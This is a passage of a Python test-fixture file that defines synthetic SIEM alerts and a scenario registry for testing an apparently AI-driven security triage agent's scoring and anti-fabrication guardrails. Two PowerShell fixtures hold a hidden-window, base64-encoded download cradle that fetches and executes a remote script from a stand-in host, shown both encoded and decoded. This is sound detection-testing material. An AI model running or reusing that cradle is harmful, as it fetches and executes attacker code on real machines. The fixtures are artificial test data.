  "test_notes": "Baseline for the shell-process-co-signal check. Consumer's suspicious_process scorer must return 0 for a bare powershell.exe with a -File argument, no -EncodedCommand, no -enc, no LOLBin keyword. If the total risk_score inflates on this shape, the co-signal logic is over-triggering."
}
""")

_PSH_B = _j(r"""
{
  "source": "QRadar WinCollect",
  "event_type": "WindowsSecurity-4688",
  "timestamp": "2026-07-05T06:15:00Z",
  "severity": "High",
  "confidence": 88,
  "category": "119 Process Execution",
  "qradar_categories": ["Process Execution", "Execution", "Malware"],
  "alert": {
    "name": "PowerShell — encoded command with download cradle",
    "description": "Windows Event 4688 — powershell.exe launched with -NoP -W Hidden -EncodedCommand under NT AUTHORITY\\SYSTEM parented by WmiPrvSE.exe. Decoded payload is a WebClient DownloadString cradle fetching a remote .ps1. Encoded-command + LOLBin pattern + high-privilege actor should all fire the co-signal path."
  },
  "raw_log": {
    "format": "WindowsEventLog-4688",
    "syslog_wrapper": "<134>1 2026-07-05T06:15:00Z winhost - - - -",
    "body": "EventID=4688 Computer=DC01.acme.local ProcessName=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe CommandLine=powershell.exe -NoP -W Hidden -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAG0AYQBsAGkAYwBpAG8AdQBzAC4AZQB4AGEAbQBwAGwAZQAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA User=NT AUTHORITY\\SYSTEM ParentProcess=C:\\Windows\\System32\\wbem\\WmiPrvSE.exe"
  },
  "parsed": {
    "event_id": 4688,
    "computer": "DC01.acme.local",
    "process_name": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "command_line": "powershell.exe -NoP -W Hidden -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAG0AYQBsAGkAYwBpAG8AdQBzAC4AZQB4AGEAbQBwAGwAZQAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA",
    "encoded_command_b64": "SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAG0AYQBsAGkAYwBpAG8AdQBzAC4AZQB4AGEAbQBwAGwAZQAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA",
    "decoded_command": "IEX(New-Object Net.WebClient).DownloadString('http://malicious.example/payload.ps1')",
    "user": "NT AUTHORITY\\SYSTEM",
    "parent_process": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
    "has_encoded_command": true,
    "has_download_cradle": true,
    "has_lolbin_pattern": true,
    "persistence_artifact_present": false
  },
  "iocs": [
    {"type": "process", "value": "powershell.exe", "pattern": "shell_process_with_cosignal",
     "note": "PowerShell + -EncodedCommand + WebClient.DownloadString = suspicious_process co-signal path SHOULD fire."},
    {"type": "url", "value": "http://malicious.example/payload.ps1", "pattern": "download_cradle_target",
     "note": "Decoded from the base64 payload. Fictional domain for the scenario."},
    {"type": "user", "value": "NT AUTHORITY\\SYSTEM", "pattern": "high_privilege_actor"},
    {"type": "process_parent", "value": "WmiPrvSE.exe", "pattern": "wmi_persistence_parent",
     "note": "WMI provider host as parent of powershell.exe is a classic T1546.003 (WMI subscription) or T1059.001 execution pattern."}
  ],
  "expected_iti_category_id": 119,
  "expected_iti_category_name": "Process Execution",
  "expected_iti_attack_severity": "SEV1",
  "expected_score_breakdown": {
    "suspicious_process": 10,
    "encoded_command": 20,
    "lolbin_pattern": 15,
    "total_bucket": "HIGH"
  },
  "expected_verdict": "MALICIOUS_CONFIRMED",
  "expected_disposition": "true_positive_confirmed_execution",
  "expected_severity": "SEV1",
  "test_notes": "Full co-signal path. All three anchors present: (a) encoded command via -EncodedCommand flag; (b) LOLBin pattern via WebClient.DownloadString; (c) high-privilege actor via NT AUTHORITY\\SYSTEM. Score MUST inflate — expected breakdown: suspicious_process +10, encoded_command +20, lolbin_pattern +15 (download cradle). Total lands in HIGH bucket. IMPORTANT: persistence_artifact_present=false — the payload does NOT include registry_run_key_write or scheduled_task_create. Analysis narrative must NOT claim T1059.001 persistence — this is one-shot execution, not persistence."
}
""")

_PSH_C = _j(r"""
{
  "source": "QRadar WinCollect",
  "event_type": "WindowsSecurity-4688",
  "timestamp": "2026-07-05T06:30:00Z",
  "severity": "High",
  "confidence": 85,
  "category": "119 Process Execution",
  "qradar_categories": ["Process Execution", "Execution"],
  "alert": {
    "name": "PowerShell — encoded command, no persistence evidence",
    "description": "Same base shape as PSH-B (encoded command + download cradle) but explicitly WITHOUT any persistence-artifact evidence in the payload. No registry Run keys written, no scheduled task created, no service installed. Tests the powershell-persistence guardrail: analysis must NOT narrate 'persistence established' without evidence."
  },
  "raw_log": {
    "format": "WindowsEventLog-4688",
    "syslog_wrapper": "<134>1 2026-07-05T06:30:00Z winhost - - - -",
    "body": "EventID=4688 Computer=WKS-CORP-217 ProcessName=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe CommandLine=powershell.exe -NoP -W Hidden -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAG0AYQBsAGkAYwBpAG8AdQBzAC4AZQB4AGEAbQBwAGwAZQAvAHMAdABhAGcAZQBSAC4AcABzADEAJwApAA User=ACME\\jane.doe ParentProcess=C:\\Windows\\explorer.exe"
  },
  "parsed": {
    "event_id": 4688,
    "computer": "WKS-CORP-217",
    "process_name": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "command_line": "powershell.exe -NoP -W Hidden -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAG0AYQBsAGkAYwBpAG8AdQBzAC4AZQB4AGEAbQBwAGwAZQAvAHMAdABhAGcAZQBSAC4AcABzADEAJwApAA",
    "decoded_command": "IEX(New-Object Net.WebClient).DownloadString('http://malicious.example/stager.ps1')",
    "user": "ACME\\jane.doe",
    "parent_process": "C:\\Windows\\explorer.exe",
    "has_encoded_command": true,
    "has_download_cradle": true,
    "persistence_artifact_present": false,
    "companion_events": {
      "registry_run_key_write": false,
      "scheduled_task_create": false,
      "service_installation": false,
      "wmi_subscription": false,
      "startup_folder_write": false
    }
  },
  "iocs": [
    {"type": "process", "value": "powershell.exe", "pattern": "shell_process_with_cosignal"},
    {"type": "url", "value": "http://malicious.example/stager.ps1", "pattern": "download_cradle_target"},
    {"type": "user", "value": "ACME\\jane.doe", "pattern": "standard_user_actor"}
  ],
  "expected_iti_category_id": 119,
  "expected_iti_category_name": "Process Execution",
  "expected_iti_attack_severity": "SEV2",
  "expected_verdict": "SUSPICIOUS",
  "expected_disposition": "true_positive_execution_no_persistence",
  "expected_severity": "SEV2",
  "test_notes": "Persistence-guardrail test. All the anti-execution signals fire (encoded-command + download cradle) but there is NO persistence-artifact evidence in the companion_events block. Consumer's analysis narrative must NOT claim 'persistence established via T1059.001' or similar without observing at least one of: registry_run_key_write / scheduled_task_create / service_installation / wmi_subscription / startup_folder_write. Correct narrative: 'encoded-command execution observed; no persistence artifact detected.' If the narrative asserts persistence anyway, the guardrail failed."
}
""")


_PA_DNS_A = _j(r"""
{
  "source": "Palo Alto Threat",
  "event_type": "PAN-THREAT-DNS",
  "timestamp": "2026-07-05T05:30:00Z",
  "severity": "Critical",
  "confidence": 90,
  "category": "110 Network Anomaly",
  "qradar_categories": ["Network Anomaly", "DNS"],
  "alert": {
    "name": "DNS Security signature — suspicious lookup sinkholed",
    "description": "Client queried a DNS name that matched a threat-intel signature. The firewall sinkholed the response (defence succeeded). Tests: consumer must (a) name the queried DOMAIN as the IOC, not the resolver IP, (b) NOT label 8.8.8.8 (Google Public DNS) as C2, (c) NOT propagate the signature-confidence severity=critical field onto incident severity, (d) recognise action=sinkhole as a defended-against event, not a live compromise."
  },
  "raw_log": {
    "format": "PAN-CSV-THREAT",
    "syslog_wrapper": "<134>1 2026-07-05T05:30:00Z pa-fw-1.acme.local PA-VM - - -",
    "body": "1,2026/07/05 05:30:00,000123457,THREAT,dns,2560,2026/07/05 05:30:00,192.168.10.5,8.8.8.8,,,DNS-Egress,,,dns-base,vsys1,Trust,Untrust,ae1.1205,ae1.99,LOG-FWD-PROFILE,2026/07/05 05:30:00,9876543,1,54321,53,54321,53,0x0,udp,sinkhole,\"suspicious.malware-family.example\",T1071.004 DNS Tunneling Detected,any,critical,client-to-server,45001,0x0,192.168.0.0-192.168.255.255,United States,0,,0,,,0,,,,,,,,,0,0,0,0,pa-fw-1,PANW,DNS-Security-Signature,86400,,,,,,dns,unknown"
  },
  "parsed": {
    "type": "THREAT",
    "subtype": "dns",
    "src": "192.168.10.5",
    "dst": "8.8.8.8",
    "dport": 53,
    "protocol": "udp",
    "action": "sinkhole",
    "misc_queried_domain": "suspicious.malware-family.example",
    "threat_id": "T1071.004 DNS Tunneling Detected",
    "severity_signature_confidence": "critical",
    "rule_name": "DNS-Egress",
    "signature_source": "DNS-Security-Signature"
  },
  "iocs": [
    {"type": "domain", "value": "suspicious.malware-family.example", "pattern": "queried_c2_domain_ioc"},
    {"type": "ip", "value": "8.8.8.8", "pattern": "public_dns_resolver_not_c2"}
  ],
  "expected_iti_category_id": 110,
  "expected_iti_category_name": "Network Anomaly",
  "expected_iti_attack_severity": "SEV3",
  "expected_artifact_mapping": {
    "primary_ioc": "suspicious.malware-family.example",
    "resolver_ip_role": "public_dns_resolver_not_c2",
    "action_disposition": "defended_sinkholed"
  },
  "expected_verdict": "SUSPICIOUS",
  "expected_disposition": "defended_sinkhole",
  "expected_severity": "SEV3",
  "test_notes": "PAN THREAT-DNS misread test. Queried domain (misc field) IS the IOC; dst 8.8.8.8 is Google Public DNS resolver used to look it up, NEVER attacker C2. action=sinkhole means the firewall already neutralised the query. severity=critical is the SIGNATURE confidence, NOT the incident severity — do not promote to SEV1 on that basis. Correct verdict: SUSPICIOUS (defended-against), not MALICIOUS. Correct recommendation: hunt for the host process that generated the query, block domain, no containment (the network never reached C2)."
}
""")


_RANSOM_D = _j(r"""
{
  "source": "CrowdStrike Falcon",
  "event_type": "EDR-Detect",
  "timestamp": "2026-07-05T05:35:00Z",
  "severity": "Medium",
  "confidence": 82,
  "category": "111 Endpoint Defense Evasion",
  "qradar_categories": ["Endpoint Defense Evasion", "Malware Sample"],
  "alert": {
    "name": "PE file with ransomware-family filename copied to Downloads — no encryption behaviour",
    "description": "YARA matched a ransomware-family signature on a PE file, but NONE of the required behavioural evidence (mass encryption, mass rename, shadow-copy deletion, ransom-note drop) has been observed on the host. Tests the never_ransomware_without_cat107_encryption guardrail — verdict must NOT be Ransomware on family-name/YARA evidence alone."
  },
  "raw_log": {
    "format": "JSON-Envelope",
    "syslog_wrapper": "<134>1 2026-07-05T05:35:00Z crowdstrike-forwarder - - - -",
    "body": "{\"detect_id\":\"ldt:sol-crowdstrike-02:0001\",\"device\":{\"hostname\":\"WKS-CORPS-042\",\"device_id\":\"sol-crowdstrike-02\"},\"process\":{\"filename\":\"C:\\\\Users\\\\dev.user\\\\Downloads\\\\locky.exe\",\"cmdline\":\"locky.exe\",\"sha256\":\"6a6d33f7bd5a2e29e5b0c8b6a9d8e4c3b2a1f0e9d8c7b6a5f4e3d2c1b0a9f8e7\",\"parent\":\"chrome.exe\"},\"behaviors\":{\"file_mass_encryption\":false,\"shadow_copy_deletion\":false,\"ransom_note_dropped\":null,\"file_mass_rename\":false},\"static_analysis\":{\"yara_match\":\"family_name_locky_variant_indicator\",\"yara_source\":\"internal_rule_set\"}}"
  },
  "parsed": {
    "device_hostname": "WKS-CORPS-042",
    "process": {
      "filename": "C:\\Users\\dev.user\\Downloads\\locky.exe",
      "cmdline": "locky.exe",
      "sha256": "6a6d33f7bd5a2e29e5b0c8b6a9d8e4c3b2a1f0e9d8c7b6a5f4e3d2c1b0a9f8e7",
      "parent_process": "chrome.exe"
    },
    "network": null,
    "behaviors": {
      "file_mass_encryption": false,
      "shadow_copy_deletion": false,
      "ransom_note_dropped": null,
      "file_mass_rename": false,
      "process_lineage": ["chrome.exe", "locky.exe"]
    },
    "static_analysis": {
      "yara_match": "family_name_locky_variant_indicator",
      "yara_source": "internal_rule_set"
    }
  },
  "iocs": [
    {"type": "hash_sha256", "value": "6a6d33f7bd5a2e29e5b0c8b6a9d8e4c3b2a1f0e9d8c7b6a5f4e3d2c1b0a9f8e7", "pattern": "yara_family_name_match_no_behavior"}
  ],
  "expected_iti_category_id": 111,
  "expected_iti_category_name": "Endpoint Defense Evasion",
  "expected_iti_attack_severity": "SEV3",
  "expected_artifact_mapping": {
    "primary_ioc": "6a6d33f7bd5a2e29e5b0c8b6a9d8e4c3b2a1f0e9d8c7b6a5f4e3d2c1b0a9f8e7",
    "yara_signal_role": "static_family_hint_only",
    "encryption_evidence_present": false
  },
  "expected_verdict": "SUSPICIOUS",
  "expected_disposition": "pre_execution_malware_sample_pending_review",
  "expected_severity": "SEV3",
  "test_notes": "Ransomware-by-filename negative test. Filename locky.exe + YARA family-name hit tempt an LLM to classify Ransomware, but ALL four required-behaviour signals are false/null: no mass-encryption, no shadow-copy deletion, no ransom-note drop, no mass-rename. Guardrail never_ransomware_without_cat107_encryption must fire — verdict SUSPICIOUS, category stays 111 Endpoint Defense Evasion, no SEV1 escalation, no ransomware-containment recommendation. Correct narrative names it a pre-execution malware sample pending analyst review."
}
""")


_BENIGN_C2_A = _j(r"""
{
  "source": "CrowdStrike Falcon",
  "event_type": "EDR-Detect",
  "timestamp": "2026-07-05T05:40:00Z",
  "severity": "Medium",
  "confidence": 60,
  "category": "110 Network Anomaly",
  "qradar_categories": ["Network Anomaly", "Beacon Suspected"],
  "alert": {
    "name": "Periodic outbound pattern — beacon-like ML signal",
    "description": "ML detector flagged svchost.exe for periodic outbound connections at 300s intervals with low stddev. All destination IOCs enrich BENIGN (Microsoft-owned infrastructure — Graph/MSAL token refresh + Windows Update). Tests the never_c2_on_benign_ioc guardrail — analysis must not fabricate a C2 attribution on IOCs that all enrichment sources agree are benign."
  },
  "raw_log": {
    "format": "JSON-Envelope",
    "syslog_wrapper": "<134>1 2026-07-05T05:40:00Z crowdstrike-forwarder - - - -",
    "body": "{\"detect_id\":\"ldt:sol-crowdstrike-03:0001\",\"device\":{\"hostname\":\"WKS-CORPS-055\"},\"process\":{\"filename\":\"C:\\\\Windows\\\\System32\\\\svchost.exe\",\"cmdline\":\"svchost.exe -k netsvcs -p -s wuauserv\",\"parent\":\"services.exe\"},\"network\":{\"connections\":[{\"remote_ip\":\"20.190.190.130\",\"remote_port\":443,\"remote_domain\":\"login.microsoftonline.com\",\"beacon_interval_seconds\":300,\"beacon_stddev_ms\":8},{\"remote_ip\":\"40.126.0.85\",\"remote_port\":443,\"remote_domain\":\"graph.microsoft.com\",\"beacon_interval_seconds\":300,\"beacon_stddev_ms\":12}]},\"detection_signal\":\"periodic_outbound_pattern_ml_score=0.72\"}"
  },
  "parsed": {
    "device_hostname": "WKS-CORPS-055",
    "process": {
      "filename": "C:\\Windows\\System32\\svchost.exe",
      "cmdline": "svchost.exe -k netsvcs -p -s wuauserv",
      "parent_process": "services.exe"
    },
    "network_connections": [
      {"remote_ip": "20.190.190.130", "remote_port": 443, "remote_domain": "login.microsoftonline.com", "beacon_interval_seconds": 300, "beacon_stddev_ms": 8},
      {"remote_ip": "40.126.0.85", "remote_port": 443, "remote_domain": "graph.microsoft.com", "beacon_interval_seconds": 300, "beacon_stddev_ms": 12}
    ],
    "detection_signal": "periodic_outbound_pattern_ml_score=0.72"
  },
  "iocs": [
    {"type": "ip", "value": "20.190.190.130", "pattern": "microsoft_owned_benign"},
    {"type": "ip", "value": "40.126.0.85", "pattern": "microsoft_owned_benign"},
    {"type": "domain", "value": "login.microsoftonline.com", "pattern": "microsoft_owned_benign"},
    {"type": "domain", "value": "graph.microsoft.com", "pattern": "microsoft_owned_benign"}
  ],
  "expected_iti_category_id": 110,
  "expected_iti_category_name": "Network Anomaly",
  "expected_iti_attack_severity": "SEV3",
  "expected_artifact_mapping": {
    "process_role": "windows_update_svchost_legitimate",
    "iocs_role": "microsoft_owned_benign_infra",
    "beacon_signal_role": "graph_msal_token_refresh_pattern"
  },
  "expected_verdict": "BENIGN",
  "expected_disposition": "false_positive_periodic_outbound_ml",
  "expected_severity": "SEV3",
  "test_notes": "C2-on-benign-IOC negative test. All 4 network IOCs are Microsoft-owned infrastructure (login.microsoftonline.com + graph.microsoft.com + their public IPs) — every enrichment source will return BENIGN. The subject line says 'beacon-like' and the ML score is 0.72, both of which tempt an LLM to fabricate a C2 story. Guardrail never_c2_on_benign_ioc must block that. Correct narrative: process is legitimate Windows Update svchost, the 300s cadence is Graph/MSAL token refresh + WU poll, verdict BENIGN, recommendation is to tune the ML rule + suppress on WU process context."
}
""")


_DNS_C2_A = _j(r"""
{
  "source": "Palo Alto Threat",
  "event_type": "PAN-THREAT-DNS",
  "timestamp": "2026-07-05T05:45:00Z",
  "severity": "High",
  "confidence": 88,
  "category": "109 Command and Control",
  "qradar_categories": ["Command and Control", "DNS"],
  "alert": {
    "name": "Single DNS lookup to known Cobalt Strike C2 domain",
    "description": "A single DNS query from an internal client resolved (via public resolver) to a domain the DNS-Security signature knows as Cobalt Strike C2 infrastructure. This is regular C2 name resolution, NOT DNS-as-transport tunneling. Tests never_dns_tunneling_without_cardinality_signal — analysis must NOT invoke T1071.004 tunneling without at least one cardinality/frequency/entropy signal present."
  },
  "raw_log": {
    "format": "PAN-CSV-THREAT",
    "syslog_wrapper": "<134>1 2026-07-05T05:45:00Z pa-fw-1.acme.local PA-VM - - -",
    "body": "1,2026/07/05 05:45:00,000123458,THREAT,dns,2560,2026/07/05 05:45:00,192.168.10.42,8.8.8.8,,,DNS-Egress,,,dns-base,vsys1,Trust,Untrust,ae1.1205,ae1.99,LOG-FWD-PROFILE,2026/07/05 05:45:00,9876544,1,55432,53,55432,53,0x0,udp,alert,\"cobaltstrike-c2-known.badactor.example\",T1071.004 DNS Tunneling Detected,any,high,client-to-server,45002,0x0,192.168.0.0-192.168.255.255,United States,0,,0,,,0,,,,,,,,,0,0,0,0,pa-fw-1,PANW,DNS-Security-Signature,86400,,,,,,dns,unknown"
  },
  "parsed": {
    "type": "THREAT",
    "subtype": "dns",
    "src": "192.168.10.42",
    "dst": "8.8.8.8",
    "dport": 53,
    "protocol": "udp",
    "action": "alert",
    "misc_queried_domain": "cobaltstrike-c2-known.badactor.example",
    "threat_id": "T1071.004 DNS Tunneling Detected",
    "severity_signature_confidence": "high",
    "rule_name": "DNS-Egress",
    "signature_source": "DNS-Security-Signature",
    "cardinality_signals": {
      "high_subdomain_cardinality": false,
      "high_query_frequency": false,
      "high_label_entropy": false,
      "response_size_anomaly": false,
      "queries_observed_last_60s": 1
    }
  },
  "iocs": [
    {"type": "domain", "value": "cobaltstrike-c2-known.badactor.example", "pattern": "known_c2_domain"},
    {"type": "ip", "value": "8.8.8.8", "pattern": "public_dns_resolver_not_c2"}
  ],
  "expected_iti_category_id": 109,
  "expected_iti_category_name": "Command and Control",
  "expected_iti_attack_severity": "SEV2",
  "expected_artifact_mapping": {
    "primary_ioc": "cobaltstrike-c2-known.badactor.example",
    "resolver_ip_role": "public_dns_resolver_not_c2",
    "tunneling_evidence_present": false,
    "correct_mitre": "T1071.001 or T1568 (name resolution to C2), NOT T1071.004"
  },
  "expected_verdict": "MALICIOUS",
  "expected_disposition": "regular_c2_name_resolution_not_tunneling",
  "expected_severity": "SEV2",
  "test_notes": "DNS-tunneling-guardrail test. Domain IS a known C2 (verdict correctly MALICIOUS), but the signature name says 'DNS Tunneling' — this tempts an LLM to narrate T1071.004 DNS-as-transport. All cardinality signals are false: 1 query in the last 60s, no subdomain fanout, no entropy spike, no response-size anomaly. Guardrail never_dns_tunneling_without_cardinality_signal must fire — the narrative must call it regular C2 name resolution (T1071.001 / T1568) and NOT tunneling. Correct recommendation: hunt for the responsible process on 192.168.10.42, block domain, no data-exfil-via-DNS narrative."
}
""")


# ── Scenario registry: (offence_id, scenario_label, raw_alert) ────


SCENARIOS: list[tuple[int, str, str, dict]] = [
    # offence_id, scenario_id, step_label, raw_alert_dict
    (SCENARIO_ID_BASE + 11, "S1", "1/5 LotL Supply Chain — Proofpoint (clean email)", _S1_A1),
    (SCENARIO_ID_BASE + 12, "S1", "2/5 LotL Supply Chain — Defender (signed download)", _S1_A2),
    (SCENARIO_ID_BASE + 13, "S1", "3/5 LotL Supply Chain — CrowdStrike (DLL side-load + persist)", _S1_A3),
    (SCENARIO_ID_BASE + 14, "S1", "4/5 LotL Supply Chain — Defender (LOLBin recon + certutil exfil)", _S1_A4),
    (SCENARIO_ID_BASE + 15, "S1", "5/5 LotL Supply Chain — Zscaler (Notion API steg-exfil)", _S1_A5),
    (SCENARIO_ID_BASE + 21, "S2", "Identity Attack Chain — MFA fatigue→PRT theft→OAuth+forward+admin", _S2),
    (SCENARIO_ID_BASE + 31, "S3", "UEFI Firmware Bootkit (BlackLotus-class)", _S3),
    (SCENARIO_ID_BASE + 41, "S4", "Insider — Steganographic ML-model exfiltration", _S4),
    # v2 advanced test payloads (2026-06-01) — TEST A through J, offence IDs 90061-90070
    (SCENARIO_ID_BASE + 61, "TEST-A", "Golden Ticket — Kerberos persistence (T1558.001)", _TA),
    (SCENARIO_ID_BASE + 62, "TEST-B", "Exchange ProxyShell — webshell + backdoor user (CVE-2021-34473)", _TB),
    (SCENARIO_ID_BASE + 63, "TEST-C", "DNS tunneling — dnscat2 exfiltration 12.4MB (T1048.003)", _TC),
    (SCENARIO_ID_BASE + 64, "TEST-D", "SIM swap → MFA bypass → Okta/AWS admin (T1111+T1098)", _TD),
    (SCENARIO_ID_BASE + 65, "TEST-E", "Linux LKM rootkit — syscall hooks + SSH key persistence (T1014)", _TE),
    (SCENARIO_ID_BASE + 66, "TEST-F", "BEC CEO wire fraud — .CO TLD + Gmail reply-to (no IOCs)", _TF),
    (SCENARIO_ID_BASE + 67, "TEST-G", "CI/CD compromise — GitHub Actions secret exfil + supply chain", _TG),
    (SCENARIO_ID_BASE + 68, "TEST-H", "Medical infusion pump — drug limits 10x↑, patient at risk (CVE-2022-26390)", _TH),
    (SCENARIO_ID_BASE + 69, "TEST-I", "Deepfake vishing — AI-synth CEO voice + BEC multi-channel", _TI),
    (SCENARIO_ID_BASE + 70, "TEST-J", "GPO abuse — domain-wide scheduled-task + persistence (T1484.001)", _TJ),
    (SCENARIO_ID_BASE + 51, "S5", "1/4 Zero-Day Chain — WAF blocked SSTI probe", _S5_A1),
    (SCENARIO_ID_BASE + 52, "S5", "2/4 Zero-Day Chain — WAF-bypassed SSTI success", _S5_A2),
    (SCENARIO_ID_BASE + 53, "S5", "3/4 Zero-Day Chain — webshell + XMRig + crontab persist", _S5_A3),
    (SCENARIO_ID_BASE + 54, "S5", "4/4 Zero-Day Chain — CloudWatch CPU spike + $847/day cost", _S5_A4),
    # v3 DEMO payloads (2026-06-09) — synthetic-IOC fixtures mirroring
    # synthetic-IOC fixtures for enrichment-bypass testing. Offence IDs 90081-90088.
    (SCENARIO_ID_BASE + 81, "DEMO-A", "107 Malware — admin-tool/4 IOCs/BENIGN_AUTHORIZED (synthetic-IOC fixture)", _DEMO_A),
    (SCENARIO_ID_BASE + 82, "DEMO-B", "108 Phishing→123 — credential-harvest link, RFC5737 sender IP", _DEMO_B),
    (SCENARIO_ID_BASE + 83, "DEMO-C", "110 Network Anomaly→114 — outbound to RFC5737 + fictional domain", _DEMO_C),
    (SCENARIO_ID_BASE + 84, "DEMO-D", "107 Malware — HR workstation, placeholder hash + NetBIOS user", _DEMO_D),
    (SCENARIO_ID_BASE + 85, "DEMO-E", "114 Cloud Security→111 — AWS IAM AttachUserPolicy from RFC5737 IP", _DEMO_E),
    (SCENARIO_ID_BASE + 86, "DEMO-F", "107 Malware — quarantined binary, synthetic hash only", _DEMO_F),
    (SCENARIO_ID_BASE + 87, "DEMO-G", "107 Malware — CORPB service acct ad-hoc PowerShell (NetBIOS-only IOC)", _DEMO_G),
    (SCENARIO_ID_BASE + 88, "DEMO-H", "108 Phishing — sender IP is real Tor exit (only TI hit in demo corpus)", _DEMO_H),
    # v4 SCAN payloads (2026-06-09) — authorized-pentest recon chain.
    # 3 alerts share source_ip + actor so related_incidents clusters them.
    # Offence IDs 90091-90093 (leaving 90089/90090 as buffer after DEMO-H).
    (SCENARIO_ID_BASE + 91, "SCAN-A", "1/3 Network recon — TCP SYN scan on WIN-PROD-DB-01 (SECTEAM\\pentester-01)", _SCAN_A),
    (SCENARIO_ID_BASE + 92, "SCAN-B", "2/3 Network recon — service-version scan on WIN-PROD-APP-01 (same actor + source)", _SCAN_B),
    (SCENARIO_ID_BASE + 93, "SCAN-C", "3/3 Network recon — vuln-script scan on WIN-PROD-WEB-01 (same actor + source)", _SCAN_C),
    # v5 ENRICH payloads (2026-06-09) — real public-TI-confirmed IOCs.
    # Positive-path complement to the DEMO synthetic-IOC batch.
    # Offence IDs 90094-90098.
    (SCENARIO_ID_BASE + 94, "ENRICH-A", "107 Ransomware — known WannaCry sample + kill-switch domain (VT/AlienVault/ThreatFox)", _ENRICH_A),
    (SCENARIO_ID_BASE + 95, "ENRICH-B", "109 C2 — historical Stuxnet C2 callback (universally TI-tagged)", _ENRICH_B),
    (SCENARIO_ID_BASE + 96, "ENRICH-C", "107 Malware — EICAR test file (100% TI confidence, positive control)", _ENRICH_C),
    (SCENARIO_ID_BASE + 97, "ENRICH-D", "117 Recon — outbound to confirmed Tor exit (TorProject/GreyNoise/AbuseIPDB)", _ENRICH_D),
    (SCENARIO_ID_BASE + 98, "ENRICH-E", "117 Recon — inbound from GreyNoise-tagged benign scanner (Shodan)", _ENRICH_E),
    # v6 SIEM-shape payloads (2026-07-05) — vendor-native raw log formats.
    # Ten scenarios exercising CEF / LEEF / Palo Alto CSV / JSON envelopes
    # with field-level test intent. Offence IDs 90101-90110.
    (SCENARIO_ID_BASE + 101, "TRELLIX-A", "111 EDR Alert — DLL side-loading via signed agent process (T1574.002, CEF)", _TRELLIX_A),
    (SCENARIO_ID_BASE + 102, "WIN-4672",  "118 Privileged Access — Event 4672 machine-account special privileges (LEEF)", _WIN_4672),
    (SCENARIO_ID_BASE + 103, "PA-SMB-A",  "110 Network Anomaly — Palo Alto TRAFFIC aged-out to TCP/445, no real exchange (CSV)", _PA_SMB_A),
    (SCENARIO_ID_BASE + 104, "PA-SMB-B",  "110 Network Anomaly — Palo Alto TRAFFIC aged-out to real Tor exit (CSV)", _PA_SMB_B),
    (SCENARIO_ID_BASE + 105, "RANSOM-A",  "107 Ransomware — baseline: encryption + shadow-copy + ransom-note + C2", _RANSOM_A),
    (SCENARIO_ID_BASE + 106, "RANSOM-B",  "107 Ransomware — source severity understated to 'Low' (category-floor test)", _RANSOM_B),
    (SCENARIO_ID_BASE + 107, "RANSOM-C",  "107 Ransomware — unjustified downstream override attempt (revert test)", _RANSOM_C),
    (SCENARIO_ID_BASE + 108, "PSH-A",     "119 Process Execution — legitimate admin PowerShell (co-signal-absent, LOW)", _PSH_A),
    (SCENARIO_ID_BASE + 109, "PSH-B",     "119 Process Execution — encoded PowerShell + download cradle (HIGH bucket)", _PSH_B),
    (SCENARIO_ID_BASE + 110, "PSH-C",     "119 Process Execution — encoded PowerShell, no persistence evidence (guardrail test)", _PSH_C),
    # v6 SIEM-shape payloads (2026-07-05, second batch) — 4 more guardrail
    # negative-case scenarios. Offence IDs 90111-90114.
    (SCENARIO_ID_BASE + 111, "PA-DNS-A",  "110 Network Anomaly — PA THREAT-DNS sinkholed, resolver-vs-C2 misread test", _PA_DNS_A),
    (SCENARIO_ID_BASE + 112, "RANSOM-D",  "111 Endpoint Defense Evasion — ransomware filename, NO encryption behavior (guardrail test)", _RANSOM_D),
    (SCENARIO_ID_BASE + 113, "BENIGN-C2-A", "110 Network Anomaly — periodic outbound to Microsoft infra (C2-on-benign-IOC guardrail)", _BENIGN_C2_A),
    (SCENARIO_ID_BASE + 114, "DNS-C2-A", "109 Command and Control — single DNS lookup to known C2 (tunneling-cardinality guardrail)", _DNS_C2_A),
]


_SEVERITY_NAME_TO_NUM = {
    "Critical": 9, "High": 7, "Medium": 5, "Low": 3, "Informational": 1,
}


def _wrap_as_qradar_offence(
    offence_id: int, scenario_id: str, step_label: str, raw: dict,
) -> dict:
    """Wrap a sophisticated alert as a QRadar offence shape.

    Preserves the FULL raw alert in ``_raw_alert`` so SARA's downstream
    agents (analysis_summary, classification) can read the complete
    narrative. Description = scenario label + source + first-line summary.
    Severity numeric from raw severity_name; start_time = source timestamp
    parsed to ms epoch.

    Same field shape as ``_build_qradar_offense`` (real QRadar API),
    so action 1456 / 636's script consumes it byte-identically.
    """
    sev_name = raw.get("severity") or "Medium"
    sev_num = _SEVERITY_NAME_TO_NUM.get(sev_name, 5)
    source = raw.get("source", "unknown")
    ts_iso = (
